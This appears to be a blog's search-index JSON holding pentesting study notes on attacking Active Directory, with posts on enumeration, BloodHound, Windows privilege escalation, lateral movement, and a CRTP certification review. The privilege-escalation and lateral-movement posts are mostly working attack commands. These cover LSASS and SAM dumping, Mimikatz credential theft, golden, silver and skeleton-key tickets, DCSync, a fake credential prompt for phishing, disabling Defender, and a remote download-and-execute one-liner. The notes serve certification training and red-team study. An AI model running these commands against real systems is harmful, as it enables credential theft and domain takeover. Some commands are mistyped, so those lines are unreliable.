A does not trust C   PowerView:  Get-NetDomainTrust [-Domain &lt;domain&gt;]   ADModule:  Get-ADTrust -Filter * [-Identity &lt;domain&gt;]   Forest Enum:  &gt; PowerView Get-NetForest [-Forest &lt;forest&gt;] Get-NetForestDomain [-Forest &lt;forest&gt;] Get-NetForestCatalog [-Forest &lt;forest&gt;] Get-NetForestTrust [-Forest &lt;forest&gt;]   &gt; ADModule Get-ADForest [-Identity &lt;forest&gt;] (Get-ADForest).Domains Get-ADForest | Select -ExpandProperty GlobalCatalogs   Extra enum:   &gt; PowerView  *local admin required this goes through RPC and SMB ports: Find-LocalAdminAccess -Verbose [-Thread &lt;int&gt;] Invoke-CheckLocalAdminAccess  Invoke-EnumerateLocalAdmin -Verbose Get-NetLocalGroup   using WMI is more stealthy:  Find-WMILocalAdminAccess.ps1 source: https://github.com/admin0987654321/admin1/blob/master/Find-WMILocalAdminAccess.ps1   Find where the domain admin has an open session:  Invoke-UserHunter [-GroupName &lt;name&gt; -Domain &lt;domain&gt; -CheckAccess -Stealth] Get-NetSession Get-NetLoggedOn   enum without PowerShell  PywerView = https://github.com/the-useless-one/pywerview WindapSearch = https://github.com/ropnop/windapsearch  ","categories": ["notes","adx"],
        "tags": ["begginer","AD","powershell"],
        "url": "/notes/adx/powershell/",
        "teaser": "/assets/images/posts/adx/adx-teaser1.jpg"
      },{
        "title": "2 - Bloodhound",
        "excerpt":"  Bloodhound      This tool is not only used to enumerate attack paths but also for the defense team to identify areas for improvement in potential security vulnerabilities within the AD    So, basically:     first u run the a Collector   bloodhound will collect AD data mostly through LDAP queries (like a regular user would do)   u’ll grab the ZIP file and upload to a local server that will give u analysis and visualization of the AD components via a Graphical Output      With this Graph u’ll be able to visualize attacks paths based on Trusts Relashionships, Poor ACL config, GPO and other stuffs    Legacy Version   apt install bloodhound neo4j neo4j console go to localhost:7474 and change de password [ default &gt; neo4j:neo4j ] bloodhound   using Covenant:  shell sharphound.exe -c all = this will capture all domain objects sharphound saves into a zip file, go ahead and copy the file name download &lt;bloodhound.zip&gt; click in the file inside covenant &gt; save file   in Bloodhound:  drag and drop the bloodhound.zip that we got earlier Database info Analysis &gt; Find all domain Admins Analysis &gt; Find Shortest Paths to Domain Admins &gt; click in connection GenericAll &gt; help &gt; abuse info   Collectors  - SharpHound = https://github.com/BloodHoundAD/SharpHound - AzureHound = https://github.com/BloodHoundAD/AzureHound - Bloodhound.py = https://github.com/fox-it/BloodHound.py - SilentHound = https://github.com/layer8secure/SilentHound - RustHound = https://github.com/NH-RED-TEAM/RustHound   Example Collection in Linux   Using Bloodhound.py:  bloodhound.py -d domain -u user -p 'password' -v --zip -c All -dc 127.0.0.1 --dns-tcp   BloodHound CE      CE stand for Community Edition and is the new version. I’ll do a step-by-step of how to use it    Visit BloodHound GitHub Repository   Read about BloodHound Community Edition   Explore BloodHound SharpHound Documentation   ​Changes:      Performance has been improved   Bloodhound CE is now accessible in a web version   Direct import of ZIP files is no longer supported. You must now load the JSON files   This version offers user management + MFA and SAML authentication   All actions on the web version are managed through the API. This API can also be used outside of Bloodhound   SharpHound has been updated to version 2.0.0      [IN SUMMARY] The new version is better for teamwork. Cause if more people are involved in the same project, any team member can visualize the results through the web.    ​ There is a new version of SharpHound (The collector):   → https://github.com/BloodHoundAD/SharpHound/releases/tag/v2.0.0      Execute the collector on the Target AD      Examples of collection:  .\\SharpHound.exe --CollectionMethods Session --Loop --Loopduration 02:00:00  --loopinterval 00:10:00​  Import-Module .\\SharpHound.ps1 Invoke-BloodHound -CollectionMethods All Invoke-BloodHound -CollectionMethods All -Stealth -OutputDirectory &lt;path&gt; Invoke-BloodHound -CollectionMethods All -LdapFilter \"(physicaldeliveryofficename=...)\"   All options of SharpHound (The collector):      Get the docker-compose.yml file   # Copyright 2023 Specter Ops, Inc.  version: '3' services:   app-db:     image: docker.io/library/postgres:13.2     environment:       - POSTGRES_USER=${POSTGRES_USER:-bloodhound}       - POSTGRES_PASSWORD=${POSTGRES_PASSWORD:-bloodhoundcommunityedition}       - POSTGRES_DATABASE=${POSTGRES_DATABASE:-bloodhound}     # Database ports are disabled by default. Please change your database password to something secure before uncommenting     # ports:     #   - ${POSTGRES_PORT:-5432}:5432     volumes:       - postgres-data:/var/lib/postgresql/data     healthcheck:       test:         [           \"CMD-SHELL\",           \"pg_isready -U ${POSTGRES_USER:-bloodhound} -d ${POSTGRES_DATABASE:-bloodhound} -h 127.0.0.1 -p 5432\"         ]       interval: 10s       timeout: 5s       retries: 5       start_period: 30s    graph-db:     image: docker.io/library/neo4j:4.4     environment:       - NEO4J_AUTH=${NEO4J_AUTH:-neo4j/bloodhoundcommunityedition}       - NEO4J_dbms_allow__upgrade=${NEO4J_ALLOW_UPGRADE:-true}     # Database ports are disabled by default. Please change your database password to something secure before uncommenting     # ports:     #   - ${NEO4J_DB_PORT:-7687}:7687     #   - ${NEO4J_WEB_PORT:-7474}:7474     volumes:       - ${NEO4J_DATA_MOUNT:-neo4j-data}:/data     healthcheck:       test:         [           \"CMD-SHELL\",           \"wget -O /dev/null -q http://localhost:${NEO4J_WEB_PORT:-7474} || exit 1\"         ]       interval: 10s       timeout: 5s       retries: 5       start_period: 30s    bloodhound:     image: docker.io/specterops/bloodhound:${BLOODHOUND_TAG:-latest}     environment:       - bhe_disable_cypher_qc=${bhe_disable_cypher_qc:-false}     ports:       - ${BLOODHOUND_PORT:-8080}:8080     ### Uncomment to use your own bloodhound.config.json to configure the application     # volumes:     #   - ./bloodhound.config.json:/bloodhound.config.json:ro     depends_on:       app-db:         condition: service_healthy       graph-db:         condition: service_healthy  volumes:   neo4j-data:   postgres-data:     Download BloodHound Docker Compose File   docker-compose -f docker-compose.yml up  or  curl -L https://ghst.ly/BHCEDocker | docker compose -f - up   Start the containers   Executing Docker-Compose:      Grab the Initial Password:      Access the bloodhound in the browser:   http://localhost:8080/ui/login   Change the Initial Password      Go to Config - Administration:      Upload the JSON Files from the colletor:         Results      Comparison of bloodhound CE with the Legacy version:        its way faster!   ","categories": ["notes","adx"],
        "tags": ["begginer","AD","enum"],
        "url": "/notes/adx/bloodhound/",
        "teaser": "/assets/images/posts/adx/adx-teaser2.jpg"
      },{
        "title": "3 - Windows Privesc",
        "excerpt":"  Privesc   &gt; Local Enum  net localgroup Users net localgroup Administrators   whoami whoami /all net users net accounts   dir env: = enum envinroment variables  wmic bios  wmic volume   &gt; network   ipconfig /all route print arp -A netstat -ano net share net use wmic netuse list full netsh firewall show state netsh firewall show config   cmd /c “dir /b /a /s c:\\ &gt; C:\\Users\\dir.txt”  then we can: type dir.txt | findstr /i passw type dir.txt | findstr /i ssh type dir.txt | findstr /i kdbx //keePass Files database type dir.txt | findstr /i vnc  other files: unattend.xml or Unattended.xml sysprep.inf or sysprep.xml web.config .bak, .log, .cnf, .conf, .ini, .xml, .txt, .gpg, .pgp, id_rsa, id_dsa, .ovpn, .rdp, vnc, ssh   &gt; credential manager  cmdkey /list runas /savecred /user:&lt;user&gt; cmd.exe   dump credentials:  iex (New-Object System.Net.WebClient).DownloadString(\"&lt;link&gt;\");Enum-Creds or Get-VaultCredential   github dumpCredStore   github Get-VaultCredential      Ask for the password for the user logged on the same machine (phishing attempt)   $cred =$host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+[Environment]::UserName,[Environment]::UserDomainName);$cred.getnetworkcredential().password  $cred =$host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\admin',[Environment]::UserDomainName);$cred.getnetworkcredential().password   SessionGopher:  find saved sessions of Putty, WinSCP, SuperPutty, FileZilla, RDP    Common Vulnerabilities  - unquoted path - weak file permissions - accessChk -uwcqv &lt;user&gt; * → sc config &lt;service&gt; binPath= &lt;exe file&gt;  - powerup - jaws - win suggestion   LSASS  Set the key ‘UseLogonCredential’ to 1: C:\\ red add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f  PS &gt; C:\\rundll32.exe User32.dll,LockWorkStation   extract lsass:  1. task manager &gt; lsass.exe &gt; create dump file &gt; save the dump 2. procdump:    a) -ma = dump all the memory   b) -r = generate a clone of the process before the dump   c) .\\procdump64 -accepteula -r -ma lsass.exe lsass 3. comsvcs.dll : rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump &lt;lsass PID&gt; lsass_comsvcs.dmp full 4. Out-Minidump: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1   a) . .\\Out-Minidump.ps1   b) Get-Process lsass | Out-Minidump   REGISTER      requires admin priv    extract register (sam, security, system):  1. reg save hklm\\sam .\\sam 2. reg save hklm\\security .\\security 3. reg save hklm\\system .\\system 4. python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system local   Mimikatz  Privilege::debug # Obtain debugging rights Token::elevate # Impersonate a token - SYSTEM or DA (Domain Admin) Sekurlsa::LogonPassword # Extract credentials Sekurlsa::pth # Perform Pass-the-Hash for command execution Lsadump::SAM # Decrypt credentials from the registry Kerberos::ptt # Perform pass-the-ticket by injecting into memory for later use Kerberos::Golden # Create Golden/Silver tickets sekurlsa::lsa /patch and /inject   example:  mimikatz.exe “privilege::debug” “sekurlsa::minidump &lt;dump file&gt; ”sekurlsa::logonpasswords\" exit Invoke-Mimikatz   Variations:   Github SafetyKatz   Github pypyKatz   AMSI2   AMSITrigger - search for malicious strings      requires admin priv    disable defender:  Set-MpPreference -DisableRealtimeMonitoring $true  ","categories": ["notes","adx"],
        "tags": ["begginer","AD","Windows"],
        "url": "/notes/adx/privesc/",
        "teaser": "/assets/images/posts/adx/adx-teaser3.jpg"
      },{
        "title": "4 - Windows Lateral Movement",
        "excerpt":"  Lateral Movement   Double-Hop:  Impacket SMbServer WsgiDav - server WebDav Invoke-TmpDavFS   PSRemoting      Local admin required    Enable-PSRemoting -Force   without saving:  Enter-PsSession -ComputerName &lt;computer&gt;   saving session:  $sess = New-PsSession -ComputerName &lt;computer&gt; Enter-PsSession -Session $sess      both are executed in wsmprovhost process    To execute to many machines: Invoke-Command   Example:  Invoke-Command -ComputerName &lt;computer&gt; -Credential &lt;user&gt; -ScriptBlock {whoami} Invoke-Command -ScriptBlock {whoami;hostname} -Credential &lt;user&gt; -ComputerName (Get-Content .\\Desktop\\computerlist.txt) Invoke-Command -FilePath &lt;path\\script.ps1&gt; -Credential &lt;user&gt; -ComputerName (Get-Content .\\Desktop\\computerlist.txt) or -Session &lt;$sess&gt;   Execute functions that were imported locally in remote machines:  Invoke-Command -ScriptBlock ${function:&lt;name&gt;} -ComputerName &lt;computer&gt;   Over Pass the Hash      With hashes in hand we can use mimikatz or invoke-mimikatz    sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:&lt;cmd&gt;  Invoke-Mimikatz -Command ‘ “command” ’   Golden Ticket  Mimikatz # lsadump::lsa /patch   Strategy:      bypass AMSI   bypass ExecutionPolicy   import mimikatz   open session in DC   bypass AMSI in DC   execute ScriptBlock remotely with Invoke-Command -Session $sess -ScriptBlock  ${Function:Invoke-Mimikatz ‘ “lsadump::lsa /patch” ’}   with krbtgt in hands we can execute the golden ticket   Mimikatz # kerberos::golden /user:&lt;user&gt; /domain:&lt;domain FQDN&gt; /sid:&lt;domain SID&gt; /krbtgt:&lt;hash&gt; /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt or /ticket to save in file      RID and Group it will be: 513, 518, 519, 520 time in minutes       Invoke-Mimikatz -Command ‘ “golden ticket command” ’   DCSync      DA is required Can run anywhere       stealthy    Mimikatz # lsadump::dcsync /user:&lt;fqdn or netbios&gt;\\krbtgt Invoke-Mimikatz ‘\"lsadump::dcsync /user:&lt;fqdn or netbios&gt;\\krbtgt\" ’   Silver Ticket   Forging a TGS   Mimikatz # kerberos::golden /user:&lt;user&gt; /domain:&lt;domain FQDN&gt; /sid:&lt;domain SID&gt; /target:&lt;target machine&gt;     /service:&lt;required service&gt; /rc4:&lt;hash&gt; /ptt    We can request services like:  - HOST - RPCSS - WSMAN - TERMSRV - CIFS - LDAP - HTTP   Skeleton Key      patch a process of LSASS in the DC and with that we can access any user with a uniq password (mimikatz)       required to be executed in the DC with a priv user    Mimikatz # misc::skeleton   example usage:  Invoke-Mimikatz -ScriptBlock ${Function:Invoke-Mimikatz} -Session $sess Enter-PsSession -ComputerName &lt;computer&gt; -Credential &lt;user fqdn&gt; //password: mimikatz   Alternative to bypass protection of LSASS:      Modifications on a kernel level is required, mimikatz must be on disk of DC machine    Mimikatz# privilege::debug Mimikatz# !+ Mimikatz# !processprotect /process:lsass.exe /remove Mimikatz# misc::skeleton Mimikatz# !-   DSRM      SafeModePassword - when u promote a server to DC       DA required    Mimikatz# token::elevate Mimikatz# lsadump::sam   first:  New-ItemProperty “HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD  Set-ItemProperty “HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\” -Name “DsrmAdminLogonBehavior” -Value 2   then:  Mimikatz# sekurlsa::pth /domain:dc (dc hostname) /user:Administrator /ntlm:&lt;hash&gt; /run:powershell.exe   Downsides:  • We can access via PSRemoting • we can access via RDP:  PS&gt; mstsc /admin   GoodSides:  # we can execute the DCSync and Golden Ticket afterwards Mimikatz # lsadump::dcsync /user:krbtgt /domain&lt;domain FQDN or netbios&gt; /dc:&lt;hostname&gt;    SSP   dynamic library (DLL)      mimikatz has mimilib.dll    add the dll file on system32 and create a referente on register  PS&gt; $tools = Get-ItemProperty HLKM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name ‘SecurityPackages’ | select -ExpandProperty ‘Security Packages’  $tools += ‘mimilib’  Set-ItemProperty HLKM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name ‘SecurityPackages’ | select -ExpandProperty ‘Security Packages’ -Value $tools  Set-ItemProperty HLKM:\\System\\CurrentControlSet\\Control\\Lsa\\ -Name ‘SecurityPackages’ | select -ExpandProperty ‘Security Packages’ -Value $tools   after the modification:   2 options:  Mimikatz# misc::memssp # all credentials gonna be stored in cleartext on kiwissp.log file   Kerberoast      Crack the password offline from the TGS    klist = can list all tickets in memory   enum the all services:  1. setspn -Q */*    select account of user:  2. Get-NetUser -SPN   we can also ask for a ticket manually:  2. Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &lt;SPN Name&gt;      with the ticket in memory, we can export the ticket to a file    Mimikatz# kerberos::list /export   two tools for cracking the ticket:  1. TGSRepCrack   python.exe .\\tgsrepcrack.py &lt;wordlist&gt; &lt;file.kirbi&gt;  2. Kirbi2john   Kerberoast Delegation   Unconstrained Delegation   &gt; Powerview Get-NetComputer -UnConstrained   &gt; ADmodule Get-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True}  Mimikatz# sekurlsa::tickets /export Mimikatz# kerberos::ptt &lt;path to the ticket&gt;   Constrained Delegation  - S4U2self &gt; Trusted_To_Authenticate_For_Delegation - S4U2proxy &gt; msDS-AllowedToDelegateTo   Discover:  &gt; Powerview Get-DomainComputer -TrustedToAuth Get-DomainUser -TrustedToAuth   &gt; ADmodule Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne “$null”} -Properties msDSAllowedToDelegateTo   Exploit:   ask fot tgt and save it in a file:  kekeo# tgt::ask /user:&lt;user&gt; /domain:&lt;FQDN&gt; /rc4:&lt;hash&gt; Mimikatz# kerberos::ptt &lt;path to ticket&gt;   last step:  kekeo# s4u /tgt:&lt;path to ticket&gt; /user:&lt;user to be impersonificated@fqdn&gt; /service:&lt;service that the user has trust&gt; Mimikatz# kerberos::ptt &lt;path to TGS&gt;   ","categories": ["notes","adx"],
        "tags": ["begginer","AD","Windows"],
        "url": "/notes/adx/zlateralmov/",
        "teaser": "/assets/images/posts/adx/adx-teaser4.jpg"
      },{
        "title": "CRTP Review",
        "excerpt":"     My Review                  Difficulty: ★★☆☆☆                         Price: ★★★★☆       $249                 Material: ★★★★☆                         Real-World Scenario: ★★★☆☆                         Worth it?: Yes, if u want to specialize in AD                         Official Site: CRTP by Altered Security                      This cert is a MUST if u enjoy Active Directory. It teaches the fundamentals and then build around that.    I’ve enjoy the materials, the support and the exam. I have nothing to complain about the content   However, even tho the teachers are amazing, they have a strong Indian accent that can make it difficult to understand some subjects. Especially for someone who already speaks English as a second language.      [ Point for improvement ] They can add subtitles to the videos    Another critique that I have, but this time not regarding the certification itself, pertains to the company Altered Security. There isn’t enough content about AD exploitation to justify having three certifications (CRTP, CRTE, CRTM). They could improve by better segregating the content or offering discounts to those who have already obtained the previous certifications.   Apart from that, I highly recommend it.   ","categories": ["review"],
        "tags": ["begginer","AD","Windows"],
        "url": "/review/crtp/",
        "teaser": "/assets/images/posts/crtp/crtp-teaser1.jpg"
      },{
        "title": "1 - AD Enumeration",
        "excerpt":"  Enumeration      Domain   GPO   ACL   Trusts   User Hunting   BloodHound   Domain Enumeration:  For enumeration we can use the following tools   − The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)   Active Directory Administration with PowerShell   ADModule on GitHub   Import-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll Import-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1      BTW, we can use ipmo as an Alias for Import-Module    BloodHound (C# and PowerShell Collectors):   BloodHound on GitHub   PowerView (PowerShell):   PowerView.ps1 in PowerSploit   . C:\\AD\\Tools\\PowerView.ps1   SharpView (C#) - Doesn’t support filtering using Pipeline:   SharpView on GitHub   Resources:   Deploy PowerShell ActiveDirectory Module Without Installing the Remote Server Tools   Domain Enumeration from PowerShell (CLM)   Get current domain:  Get-Domain (PowerView) Get-ADDomain (ActiveDirectory Module)   Get object of another domain:  Get-Domain -Domain domain.local Get-ADDomain -Identity domain.local   Get domain SID for the current domain:  Get-DomainSID (Get-ADDomain).DomainSID   Get domain policy for the current domain:  Get-DomainPolicyData (Get-DomainPolicyData).systemaccess   Get domain policy for another domain:  (Get-DomainPolicyData -domain domain.local).systemaccess   Get domain controllers for the current domain:  Get-DomainController Get-ADDomainController   Get domain controllers for another domain:  Get-DomainController -Domain domain.local Get-ADDomainController -DomainName domain.local -Discover  Get a list of users in the current domain:  Get-DomainUser Get-DomainUser -Identity student1 Get-ADUser -Filter * -Properties * Get-ADUser -Identity student1 -Properties *   Get list of all properties for users in the current domain:  Get-DomainUser -Identity student1 -Properties * Get-DomainUser -Properties samaccountname,logonCount Get-DomainUser -Properties pwdlastset Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name Get-ADUser -Filter * -Properties * | select\tname,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset )}}   Search for a particular string in a user’s attributes:  Get-DomainUser -LDAPFilter \"Description=*built*\" | Select name,Description Get-ADUser -Filter 'Description -like \"*built*\"' -Properties Description | select name,Description   Get a list of computers in the current domain:  Get-DomainComputer | select Name,logonCount Get-DomainComputer -OperatingSystem \"*Server 2022*\" Get-DomainComputer -Ping Get-ADComputer -Filter * | select Name Get-ADComputer -Filter * -Properties * Get-ADComputer -Filter 'OperatingSystem -like \"*Server 2022*\"' -Properties OperatingSystem | select Name,OperatingSystem Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}   Get all the groups in the current domain:  Get-DomainGroup | select Name Get-DomainGroup -Domain &lt;targetdomain&gt; Get-ADGroup -Filter * | select Name Get-ADGroup -Filter * -Properties *   Get all groups containing the word “admin” in group name:  Get-DomainGroup *admin* Get-ADGroup -Filter 'Name -like \"*admin*\"' | select Name   Get all the members of the Domain Admins group:  Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse Get-ADGroupMember -Identity \"Domain Admins\" -Recursive   Get the group membership for a user:  Get-DomainGroup -UserName \"student1\" Get-ADPrincipalGroupMembership -Identity student1   List all the local groups on a machine (needs administrator privs on non-dc machines) :  Get-NetLocalGroup -ComputerName domain-dc   Get members of the local group “Administrators” on a machine (needs administrator privs on non-dc machines) :  Get-NetLocalGroupMember -ComputerName domain-dc -GroupName Administrators   Get actively logged users on a computer (needs local admin rights on the target):  Get-NetLoggedon -ComputerName domain-admin   Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS):  Get-LoggedonLocal -ComputerName domain-admin   Get the last logged user on a computer (needs administrative rights and remote registry on the target):  Get-LastLoggedOn -ComputerName domain-admin   Find shares on hosts in current domain:  Invoke-ShareFinder -Verbose   Find sensitive files on computers in the domain:  Invoke-FileFinder -Verbose   Get all fileservers of the domain:  Get-NetFileServer   Learning Objective 1   Enumerate following for the dollarcorp domain:      Users   Computers   Domain Administrators   Enterprise Administrators   GPO   Get list of GPO in current domain:  Get-DomainGPO Get-DomainGPO -ComputerIdentity domain-computer   Get GPO(s) which use Restricted Groups or groups.xml for interesting users:  Get-DomainGPOLocalGroup   Get users which are in a local group of a machine using GPO:  Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity domain-computer   Get machines where the given user is member of a specific group:  Get-DomainGPOUserLocalGroupMapping -Identity user -Verbose   Get OUs in a domain:  Get-DomainOU Get-ADOrganizationalUnit -Filter * -Properties *   Get GPO applied on an OU. Read GPOname from gplink attribute from:  Get-NetOU Get-DomainGPO -Identity \"{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}\"   Get users which are in a local group of a machine in any OU using GPO:  (Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping   Get users which are in a local group of a machine in a particular OU using GPO:  (Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping   There is a bug in PowerView, otherwise the below command would work:  Get-DomainGPOComputerLocalGroupMapping -OUIdentity 'OU=Mgmt,DC=us,DC=techcorp,DC=local'   Learning Objective 2   Enumerate following for the dollarcorp domain:   – List all the OUs – List all the computers in the StudentMachines OU   (Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name   – List the GPOs – Enumerate GPO applied on the StudentMachines OU.   ACL      Get the ACLs associated with the specified object:  Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs   Get the ACLs associated with the specified prefix to be used for search:  Get-DomainObjectAcl -SearchBase \"LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\" -ResolveGUIDs -Verbose   We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs:  (Get-Acl 'AD:\\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access   Search for interesting ACEs:  Find-InterestingDomainAcl -ResolveGUIDs   Get the ACLs associated with the specified path:  Get-PathAcl -Path \"\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\"   Learning Objective 3   Enumerate following for the dollarcorp domain:   – ACL for the Domain Admins group – All modify rights/permissions for the studentx   Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match “studentx”}   GenericAll = FullControl reading ACL = in &lt;ObjectDN&gt;, (all users in) the group &lt;IdentityReferenceName&gt; have &lt;ActiveDirectoryRights&gt;  # example    &gt; in Control2User, (all users in) the group RDPUsers have GenericAll (full controll) permissions      Trusts      In an AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.   Trust can be automatic (parent-child, same forest etc.) or established (forest, external).   Trusted Domain Objects (TDOs) represent the trust relationships in a domain.   Domain Trust mapping   Get a list of all domain trusts for the current domain:  Get-DomainTrust Get-DomainTrust -Domain domain.local Get-ADTrust Get-ADTrust -Identity domain.local   Forest mapping   Get details about the current forest:  Get-Forest Get-Forest -Forest domain.local Get-ADForest Get-ADForest -Identity domain.local   Get all domains in the current forest:  Get-ForestDomain Get-ForestDomain -Forest domain.local (Get-ADForest).Domains   Get all global catalogs for the current forest:  Get-ForestGlobalCatalog Get-ForestGlobalCatalog -Forest domain.local Get-ADForest | select -ExpandProperty GlobalCatalogs   Map trusts of a forest (no Forest trusts in the lab):  Get-ForestTrust Get-ForestTrust -Forest domain.local Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne \"$null\"'   Learning Objective 4      Enumerate all domains in the moneycorp.local forest.   Map the trusts of the dollarcorp.moneycorp.local domain.   Map External trusts in moneycorp.local forest.    Get-ForestDomain | %{Get=DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq “FILTER_SIDS”}      Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?   Get-ForestDomain -Forest eurocorp.local | %{Get=DomainTrust -Domain $_.Name}      no, we cant enumerate beyong trusts relationships    User Hunting      More intrusive    Find all machines on the current domain where the current user has local admin access  Find-LocalAdminAccess -Verbose   This function queries the DC of the current or provided domain for a list of computers  (Get-NetComputer) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine.      This can also be done with the help of remote administration tools like WMI and PowerShell remoting.       Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.    See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1   Find computers where a domain admin (or specified user/group) has sessions:  Find-DomainUserLocation -Verbose Find-DomainUserLocation -UserGroupIdentity \"RDPUsers\"   This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-DomainGroupMember, gets a list of computers (Get-DomainComputer) and list sessions and logged on users:  (Get-NetSession/Get-NetLoggedon) from each machine.      Note that for Server 2019 and onwards, local administrator privileges are required to list sessions.    Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).  Find-DomainUserLocation -CheckAccess   Find computers (File Servers and Distributed File servers) where a domainadmin session is available.  Find-DomainUserLocation -Stealth   BloodHound      can create a lot of noise       So if you can’t get caught, don’t run it. Just enumerate manually       Provides GUI for AD entities and relationships for the data collected by its ingestors.   Uses Graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins.   BloodHound on GitHub      There are built-in queries for frequently used actions.   Also supports custom Cypher queries.   [blue team / pentester]   Supply data to BloodHound (Remember to bypass .NET AMSI):  . C:\\AD\\Tools\\BloodHound-master\\Collectors\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All  or  SharpHound.exe      The generated archive can be uploaded to the BloodHound application.    [red team]   To make BloodHound collection stealthy, use Stealth option. This removes noisy collection methods like RDP, DCOM, PSRemote and LocalAdmin:  Invoke-BloodHound –Stealth  or  SharpHound.exe –-Stealth   To avoid detections like MDI:  Invoke-BloodHound -ExcludeDCs   Learning Objective 6      Setup BloodHound and identify shortest path to Domain Admins in the dollarcorp domain.    Windows outside of the domain:  runas /netonly /user:domain\\user cmd.exe sharphound-v2.0.0\\SharpHound.exe -c All --domaincontroller &lt;DC IP&gt; --domain &lt;domain&gt; --ldapusername &lt;user&gt; --ldappassword “passwd” --distinguishedname \"OU=BR\"   SharpHound on GitHub   Linux:  bloodhound-python -u &lt;user&gt; -p 'passwd' -ns &lt;DC IP&gt; -dc &lt;FQDN&gt; -d &lt;domain&gt; -c all --zip -gc &lt;specify DC if necessary&gt; --dns-tcp   BloodHound.py on GitHub   My Mind Map      Just keep in mind that Enumeration is the MOST important part of a pentest/red team assessment    Prep Tools  inviShell powerview ad-module   Enum  — 1 —  Users Computers Domains Admins Enterprise Admins   — 2 —  OUs Computers in the OUs GPOs GPO applied to our machine   — 3 —  ACLs All modify rights/permissions   — 4 —  All domains Map trusts domains Map external trusts forest Identify external trusts. Can u enumerate?   Privesc   — 5 —  Try Local Privesc Identify if u have local admin in other machines   Think of Estrategies   — 6 —  Setup BloodHound &amp; identify the shortest path to DA   Getting DA   — 7 —  Identify a machine in the target domain where DA session is available Compromise the machine and escalate to DA   — 8 —  Extract secrets from DC Create a golden ticket with the krbtgt account secrets Get DA with golden ticket   — 9 —  Try to get command execution on the DC by creating a Silver Ticket   — 10 —  Use DA privileges to execute Diamond Ticket   — 11 —  Use DA privileges to abuse DSRM credential for persistence   — 12 —  Check if the user has Replication (DCSync) Rights   if yes : execute DCSync to pull hashes of the krbtgt user   if no : add replication rights and execute DCSync   — 13 —  Modify Security descriptors on dc to get access using Powershell Remoting and WMI without requiring administrator access Retrieve machine account hash from dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI   — 14 —  Using Kerberoasting Attack, crack password of a SQL server service account   — 15 —  Find a server in the DC where Unconstrained Delegation is enabled Compromise the server and escalate to DA Escalate to EA by abusing Printer Bug   — 16 —  Enumerate users in the domain for whom Contrained Delegation is enabled:   Request a TGT from the DC and obtain TGS for the service to which delegation is configured   Pass the ticket and access the service Enumerate computer accounts for which Contrained Delegation is enabled:   For such a user, request a TGT from the DC   Obtain an alternate TGS for LDAP service on the target machine   Use the TGS for executing DCSync attack   — 17 —  Find a computer object in the domain where we have Write Permissions Abuse the Write permissions to access that computer as DA   — 18 —  Using DA access to dollarcorp, escalate privileges to EA or DA to parent domain, moneycorp using the domain trust key   — 19 —  Using DA access to dollarcorp, escalate privileges to EA or DA to  parent domain, moneycorp using dollarcorp krbtgt hash   — 20 —  With DA privileges on dollarcorp, get access to SharedWithDCorp share on the DC of eurocorp forest   — 21 —  Check if DA CS is used by the target forest and find any vulnerable/abusable templates Abuse any such templates to escalate to DA and EA   Esc1   Esc3   Esc6   — 22 —  Get a reverse shell on a SQL Server in eurocorp forest by abusing database links from dcorp-mssql   ","categories": ["notes","crtp"],
        "tags": ["begginer","AD","Windows","enum"],
        "url": "/notes/crtp/enum/",
